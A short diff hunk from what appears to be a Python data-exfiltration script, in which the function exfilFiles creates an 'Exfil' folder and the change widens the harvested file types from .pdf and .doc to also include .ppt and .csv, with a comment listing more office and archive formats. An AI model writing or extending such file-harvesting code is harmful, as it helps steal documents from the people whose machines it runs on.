@@ -69,7 +69,7 @@ def exfilFiles():
         print('Exfil folder already created')
         pass
    #Uncomment to get all these files (".pdf", ".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".zip")
-    ext = (".pdf", ".doc")
+    ext = (".pdf", ".doc", ".ppt", ".csv")
     for fileType in ext:
         getInfo(fileType)
 
